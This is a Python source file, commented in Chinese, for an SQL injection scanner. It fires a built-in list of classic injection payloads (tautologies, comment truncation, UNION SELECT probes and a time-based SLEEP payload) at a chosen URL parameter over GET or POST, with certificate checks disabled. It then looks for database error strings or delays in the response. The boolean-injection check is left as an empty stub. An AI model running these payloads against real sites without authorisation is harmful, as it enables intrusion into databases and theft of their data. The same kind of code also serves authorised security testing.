"""
SQL注入测试
输入: {target_url, method, param_name, payloads, check_union, check_boolean}
输出: {vulnerable, payload_used, error_detected, time_based}
"""

import requests
import json
import time
import re

requests.packages.urllib3.disable_warnings()


# SQL注入Payload
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "admin'--",
    "admin' OR '1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1' OR '1'='1",
]

# SQL错误特征
SQL_ERROR_PATTERNS = [
    'sql', 'syntax error', 'mysql', 'postgresql', 'oracle',
    'sqlite', 'sqlstate', 'microsoft sql', 'odbc driver',
    'sql error', 'sqlsrv', 'mariadb', 'access denied',
    'sql_injection', 'sql injection'
]


def sqli_tester(config):
    """
    测试SQL注入漏洞
    
    输入:
        target_url: string - 目标URL
        method: "GET" | "POST"
        param_name?: string - 参数名
        payloads?: string[] - 自定义payload
        check_union?: boolean - 是否检测UNION注入
        check_boolean?: boolean - 是否检测布尔注入
    
    输出:
        vulnerable: boolean
        payload_used?: string
        error_detected?: string
        time_based?: boolean
    """
    target_url = config.get('target_url')
    method = config.get('method', 'POST').upper()
    param_name = config.get('param_name', 'id')
    payloads = config.get('payloads', SQLI_PAYLOADS)
    
    result = {
        'vulnerable': False,
        'payload_used': None,
        'error_detected': None,
        'time_based': False
    }
    
    for payload in payloads:
        try:
            # 构建测试请求
            if method == 'GET':
                if '?' in target_url:
                    test_url = f"{target_url}&{param_name}={payload}"
                else:
                    test_url = f"{target_url}?{param_name}={payload}"
                resp = requests.get(test_url, timeout=10, verify=False)
            else:
                test_data = {param_name: payload}
                resp = requests.post(
                    target_url,
                    json=test_data,
                    timeout=10,
                    verify=False
                )
            
            # 检查SQL错误
            if resp.status_code == 200:
                body = resp.text.lower()
                
                # 检查是否包含SQL错误
                for error_pattern in SQL_ERROR_PATTERNS:
                    if error_pattern in body:
                        result['vulnerable'] = True
                        result['payload_used'] = payload
                        result['error_detected'] = error_pattern
                        return result
                
                # 检查响应差异（可能表示注入生效）
                if "or '1'='1" in payload.lower():
                    # 布尔注入测试
                    # 正常: 1 -> 假: payload -> 应该不同
                    pass
            
        except Exception as e:
            pass
    
    return result


def sqli_time_based_tester(config):
    """
    时间盲注测试
    
    输入:
        target_url: string
        method: "GET" | "POST"
        param_name: string
        delay: number - 延迟秒数
    
    输出:
        vulnerable: boolean
        time_taken: number
    """
    target_url = config.get('target_url')
    method = config.get('method', 'GET').upper()
    param_name = config.get('param_name', 'id')
    delay = config.get('delay', 5)
    
    payload = f"1' AND SLEEP({delay})--"
    
    start = time.time()
    
    try:
        if method == 'GET':
            test_url = f"{target_url}?{param_name}={payload}"
            resp = requests.get(test_url, timeout=30, verify=False)
        else:
            test_data = {param_name: payload}
            resp = requests.post(target_url, json=test_data, timeout=30, verify=False)
        
        elapsed = time.time() - start
        
        if elapsed >= delay:
            return {
                'vulnerable': True,
                'time_taken': elapsed,
                'payload': payload
            }
    except:
        pass
    
    return {
        'vulnerable': False,
        'time_taken': elapsed if 'elapsed' in dir() else 0
    }


def verify_sqli_response(response):
    """
    验证响应是否是SQL注入结果
    
    输入:
        response: {status, body, headers}
    
    输出:
        is_sqli: boolean
        sqli_type: string
        evidence: string
    """
    body = response.get('body', '').lower()
    
    # 检查SQL错误
    for pattern in SQL_ERROR_PATTERNS:
        if pattern in body:
            return {
                'is_sqli': True,
                'sqli_type': 'error_based',
                'evidence': pattern
            }
    
    # 检查是否是数据库错误JSON
    try:
        data = json.loads(response.get('body', ''))
        if isinstance(data, dict):
            msg = str(data.get('msg', '')).lower()
            for pattern in SQL_ERROR_PATTERNS:
                if pattern in msg:
                    return {
                        'is_sqli': True,
                        'sqli_type': 'error_based',
                        'evidence': msg[:200]
                    }
    except:
        pass
    
    return {
        'is_sqli': False,
        'sqli_type': None,
        'evidence': None
    }


if __name__ == '__main__':
    # 测试
    result = sqli_tester({
        'target_url': 'http://example.com/api/login',
        'method': 'POST',
        'param_name': 'username'
    })
    print(f"Vulnerable: {result['vulnerable']}")
